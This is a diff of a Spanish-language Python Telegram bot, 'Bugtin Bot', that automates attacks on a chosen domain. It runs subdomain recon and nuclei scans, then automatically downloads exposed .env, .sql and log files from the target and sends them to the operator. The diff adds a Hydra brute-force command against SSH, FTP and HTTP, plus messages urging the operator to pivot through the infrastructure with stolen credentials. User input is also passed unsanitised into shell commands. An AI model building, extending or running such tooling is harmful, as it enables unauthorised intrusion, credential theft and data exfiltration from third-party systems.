@@ -20,14 +20,14 @@ def analizar_y_explicar(archivo_reporte):
         content = f.read().lower()
 
     if any(x in content for x in ["critical", "high", ".env", "config", "password", "aws_"]):
-        impacto += "⚠️ **Nivel: CRÍTICO / ALTO**\nSe han detectado fugas de credenciales, llaves API o archivos de configuración críticos."
-        instrucciones += "1. He intentado descargar los archivos automáticamente.\n2. Revisa los adjuntos; podrías encontrar accesos directos a bases de datos o servicios en la nube."
+        impacto += "⚠️ **Nivel: CRÍTICO / ALTO**\nSe detectaron fugas de credenciales o archivos críticos."
+        instrucciones += "1. Analiza los archivos descargados; contienen accesos directos.\n2. Usa estos datos para pivotar en la infraestructura."
     elif any(x in content for x in ["200", "medium", "backup", ".sql", ".log"]):
-        impacto += "⚠️ **Nivel: MEDIO**\nSe encontraron rutas con Status 200, respaldos o logs expuestos."
-        instrucciones += "1. Analiza los archivos descargados.\n2. Si hay un panel de administración, intenta usar credenciales comunes o busca vulnerabilidades de bypass."
+        impacto += "⚠️ **Nivel: MEDIO**\nSe encontraron rutas expuestas, respaldos o logs."
+        instrucciones += "1. Revisa los logs en busca de nombres de usuario.\n2. Intenta un ataque de fuerza bruta con `/fuerza`."
     else:
-        impacto += "ℹ️ **Nivel: INFORMACIÓN**\nSolo se detectó información técnica y de infraestructura."
-        instrucciones += "1. Usa esta información para planear un ataque más dirigido hacia versiones específicas del servidor."
+        impacto += "ℹ️ **Nivel: INFORMACIÓN**\nSolo se detectó información técnica."
+        instrucciones += "1. Úsala para perfilar el servidor objetivo."
     
     return impacto, instrucciones
 
@@ -35,12 +35,12 @@ def analizar_y_explicar(archivo_reporte):
 def descargar_filtracion(url, chat_id):
     try:
         clean_url = url.strip()
+        # Limpiar nombre de archivo para evitar errores de sistema
         file_name = "exfil_" + clean_url.split("/")[-1].split(" ")[0].replace(":", "_").replace("?", "_")
-        
         if not file_name or len(file_name) < 5: 
             file_name = f"exfil_data_{int(time.time())}.txt"
 
-        # Descarga usando curl (-k para ignorar errores SSL)
+        # Descarga silenciosa ignorando errores de certificado SSL
         subprocess.run(f"curl -s -k -L {clean_url} -o {file_name}", shell=True)
         
         if os.path.exists(file_name) and os.path.getsize(file_name) > 10:
@@ -55,20 +55,22 @@ def descargar_filtracion(url, chat_id):
 def send_welcome(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
         help_text = (
-            "🤖 **Bugtin Bot v7.1 - Auto-Exfiltración**\n\n"
-            "📡 `/subs` - Reconocimiento de subdominios.\n"
-            "🔓 `/archivos` - Escaneo con descarga automática de filtraciones.\n\n"
-            "🚀 *El bot descargará automáticamente archivos .env, .sql, .log y más.*"
+            "🤖 **Bugtin Bot v7.5 - Hydra Ready**\n\n"
+            "📡 `/subs` - Recon de subdominios.\n"
+            "🔓 `/archivos` - Escaneo y exfiltración automática.\n"
+            "⚡ `/fuerza` - Ataque Hydra (SSH, FTP, HTTP).\n\n"
+            "🚀 *Usa los botones o comandos para operar.*"
         )
         markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add("📡 Solo Subdominios", "🔓 Buscar Archivos Expuestos")
+        markup.add("⚡ Ataque de Fuerza Bruta")
         bot.send_message(message.chat.id, help_text, reply_markup=markup, parse_mode="Markdown")
 
 # --- LÓGICA: RECONOCIMIENTO ---
 @bot.message_handler(commands=['subs'])
 def start_subs(message):
     if str(message.chat.id) == YOUR_CHAT_ID:
-        msg = bot.send_message(message.chat.id, "🎯 **Escribe el dominio objetivo:**")
+        msg = bot.send_message(message.chat.id, "🎯 **Escribe el dominio objetivo (ej: google.com):**")
         bot.register_next_step_handler(msg, process_subdomains_step)
 
 def process_subdomains_step(message):
@@ -81,11 +83,13 @@ def process_subdomains_step(message):
         subprocess.run(f"subfinder -d {target} -o s1.txt -silent", shell=True)
         if os.path.exists("common.txt"):
             subprocess.run(f"gobuster dns --domain {target} --wordlist common.txt --quiet --output s2.txt", shell=True)
+        
         subprocess.run(f"cat s1.txt s2.txt > {output} 2>/dev/null", shell=True)
         subprocess.run(f"sort -u {output} -o {output}", shell=True)
+        
         if os.path.exists(output) and os.path.getsize(output) > 0:
             with open(output, "rb") as f:
-                bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento completado: {target}")
+                bot.send_document(chat_id, f, caption=f"🏁 Reconocimiento: {target}")
         else:
             bot.send_message(chat_id, "❌ No se encontraron resultados.")
     except Exception as e:
@@ -102,38 +106,72 @@ def process_vulns_step(message):
     target = message.text.strip().lower()
     chat_id = message.chat.id
     report_file = f"rep_{target.replace('/', '_')}.txt"
-    bot.send_message(chat_id, f"🔍 Auditando `{target}`...\n\nAnalizando y descargando filtraciones automáticamente.", parse_mode="Markdown")
+    bot.send_message(chat_id, f"🔍 Auditando `{target}`...\n\nBuscando filtraciones automáticamente.", parse_mode="Markdown")
     try:
         subprocess.run(f"nuclei -u {target} -tags exposure,cve,config,panel -o {report_file} -silent", shell=True)
-        for wl in ["api-routes.txt", "logins.txt"]:
-            if os.path.exists(wl):
-                tmp = "tmp_sc.txt"
-                subprocess.run(f"gobuster dir --url {target} --wordlist {wl} --quiet --output {tmp}", shell=True)
-                if os.path.exists(tmp):
-                    subprocess.run(f"cat {tmp} >> {report_file}", shell=True)
-                    os.remove(tmp)
+        
         if os.path.exists(report_file) and os.path.getsize(report_file) > 0:
             imp, gui = analizar_y_explicar(report_file)
             bot.send_message(chat_id, f"{imp}\n\n{gui}", parse_mode="Markdown")
+            
             with open(report_file, "r") as f:
                 for line in f:
                     if "http" in line and any(ext in line for ext in [".env", ".sql", ".log", ".json", ".conf", ".bak", ".old", ".yaml"]):
                         match = re.search(r'https?://[^\s\[\]\(\)]+', line)
                         if match:
-                            url_found = match.group(0)
-                            descargar_filtracion(url_found, chat_id)
+                            descargar_filtracion(match.group(0), chat_id)
+            
             with open(report_file, "rb") as doc:
                 bot.send_document(chat_id, doc, caption=f"📄 Reporte de auditoría: {target}")
         else:
-            bot.send_message(chat_id, f"✅ No se detectaron filtraciones evidentes en `{target}`.")
+            bot.send_message(chat_id, f"✅ No se detectaron vulnerabilidades en `{target}`.")
     except Exception as e:
-        bot.send_message(chat_id, f"⚠️ Error en auditoría: {str(e)}")
+        bot.send_message(chat_id, f"⚠️ Error: {str(e)}")
 
+# --- LÓGICA: FUERZA BRUTA (Hydra) ---
+@bot.message_handler(commands=['fuerza'])
+def start_fuerza(message):
+    if str(message.chat.id) == YOUR_CHAT_ID:
+        msg = bot.send_message(message.chat.id, "⚔️ **Ataque Hydra**\n\nFormato: `IP Servicio Usuario` \nEj: `1.1.1.1 ssh root`", parse_mode="Markdown")
+        bot.register_next_step_handler(msg, process_fuerza_step)
+
+def process_fuerza_step(message):
+    try:
+        data = message.text.split()
+        if len(data) < 3:
+            bot.send_message(message.chat.id, "❌ Formato: `IP Servicio Usuario` (ej: 10.0.0.1 ftp admin)")
+            return
+        
+        ip, servicio, user = data[0], data[1], data[2]
+        chat_id = message.chat.id
+        pass_list = "passwords.txt"
+        
+        if not os.path.exists(pass_list):
+            with open(pass_list, "w") as f: f.write("admin\n123456\npassword\nroot\n12345")
+
+        bot.send_message(chat_id, f"⚡ Atacando `{ip}` vía `{servicio}` para `{user}`...")
+        
+        res_file = "hydra_res.txt"
+        # El bot llama al binario de hydra que instalaste en el sistema
+        subprocess.run(f"hydra -l {user} -P {pass_list} -t 4 -f {ip} {servicio} -o {res_file}", shell=True)
+        
+        if os.path.exists(res_file) and os.path.getsize(res_file) > 0:
+            with open(res_file, "r") as f:
+                bot.send_message(chat_id, f"🎯 **¡ACCESO OBTENIDO!**\n\n`{f.read()}`", parse_mode="Markdown")
+            os.remove(res_file)
+        else:
+            bot.send_message(chat_id, f"❌ No se encontró la contraseña para el usuario `{user}`.")
+            
+    except Exception as e:
+        bot.send_message(message.chat.id, f"⚠️ Error: Asegúrate de que Hydra esté instalado correctamente.")
+
+# --- BOTONES ---
 @bot.message_handler(func=lambda m: m.text == "📡 Solo Subdominios")
 def btn_subs(m): start_subs(m)
-
 @bot.message_handler(func=lambda m: m.text == "🔓 Buscar Archivos Expuestos")
 def btn_arch(m): start_archivos(m)
+@bot.message_handler(func=lambda m: m.text == "⚡ Ataque de Fuerza Bruta")
+def btn_fuerza(m): start_fuerza(m)
 
-print("🚀 Bugtin Bot v7.1 Online.")
+print("🚀 Bugtin Bot v7.5 Online. Hydra integrado.")
 bot.polling()
